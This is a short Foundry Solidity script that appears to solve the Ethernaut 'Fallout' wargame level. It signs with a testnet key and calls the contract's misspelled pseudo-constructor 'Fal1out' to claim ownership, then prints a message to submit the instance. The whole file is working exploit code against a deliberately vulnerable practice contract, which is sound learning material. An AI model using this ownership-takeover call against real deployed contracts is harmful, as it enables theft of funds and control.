// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {IFallout} from "src/hack/interfaces/IFallout.sol";

contract HackFalloutScript is Script {
    function run() external {
        IFallout fallout = IFallout(vm.envAddress("FALLOUT_ADDRESS"));
        uint256 deployerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");
        vm.startBroadcast(deployerKey);
        fallout.Fal1out();
        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
